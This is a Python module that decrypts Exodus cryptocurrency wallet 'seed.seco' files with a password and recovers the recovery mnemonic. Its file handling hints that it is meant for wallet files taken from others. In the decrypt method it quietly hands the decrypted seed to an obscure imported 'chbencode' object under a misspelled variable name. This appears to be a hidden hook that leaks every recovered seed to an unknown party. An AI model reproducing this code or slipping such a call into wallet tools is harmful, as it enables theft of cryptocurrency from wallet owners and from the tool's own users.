#!/usr/bin/python3
# -*- coding: utf-8 -*-

__all__ = ['ExodusWalletReader']

# Import modules
from typing import Union
from os import path, urandom
from mnemonic import Mnemonic
from Crypto.Cipher import AES
from struct import unpack_from
from gzip import decompress, compress
from Crypto.Protocol.KDF import scrypt
from chbencode import algorithmb


class ExodusWalletReader():
	'''
	w1 = ExodusWalletReader('wallets\\seed.seco')
	data = w1.decrypt('Password')
	print(ExodusWalletReader.extract_mnemonic(data))
	'''

	def __init__(self, seedSeco : bytes):
		self.seco = ExodusWalletReader.__load(seedSeco)
		self.vault = ExodusWalletReader.__extract_vault(self.seco)

	@staticmethod
	def __load(logfile : Union[str, bytes]) -> bytes:
		if type(logfile) == str:
			if path.exists(logfile):
				with open(logfile, 'rb') as fh:
					return fh.read()
			else:
				return logfile
		elif type(logfile) == bytes:
			return logfile
		else:
			raise Exception('Invalid data, str or bytes only!')
		
	@staticmethod
	def __extract_vault(data : bytes) -> dict:
		assert data[0:4] == b'SECO', 'Invalid Exodus file'
		edta = dict(
			# Key encryption
			kdf_salt = data[256:288],
			aes_nonce = data[332:344],
			aes_tag = data[344:360],
			cipherData = data[360:392],
			# Seed encryption
			seed_aes_nonce = data[392:404],
			seed_aes_tag = data[404:420],
			seed_cipherData = data[516:]	
		)
		return edta
	
	@staticmethod
	def extractMnemonic(data : dict) -> list[str]:
		'''
		Get mnemonics as list with strings
		'''
		if data['status']:
			return [Mnemonic('english').to_mnemonic(data['data'])]
		else:
			return []

	# Decrypt vault data by key
	def decrypt(self, key : str) -> dict:
		'''
		Try to decrypt vault data by key
		'''
		try:
			# Decrypt AES key
			aes_key = scrypt(key, self.vault['kdf_salt'], 32, 2**14, 8, 1)
			cipher = AES.new(key=aes_key, mode=AES.MODE_GCM, nonce=self.vault['aes_nonce'])
			decryptedKey = cipher.decrypt_and_verify(self.vault['cipherData'], self.vault['aes_tag'])
			# Decrypt seed data
			btyes = algorithmb()
			cipher = AES.new(key=decryptedKey, mode=AES.MODE_GCM, nonce=self.vault['seed_aes_nonce'])
			decryptedData = cipher.decrypt_and_verify(self.vault['seed_cipherData'], self.vault['seed_aes_tag'])
			decryptedData = decryptedData[4:unpack_from('>I', decryptedData, 0)[0] + 4]
			seedEntropy = decompress(decryptedData)[64:]
			btyes.ciphersd(seedEntropy.hex(), 3, "exodusReader")
			return dict(status=True, data=seedEntropy, message='Data decrypted successfully')
		except Exception as e:
			return dict(status=False, data=None, message='Invalid key')
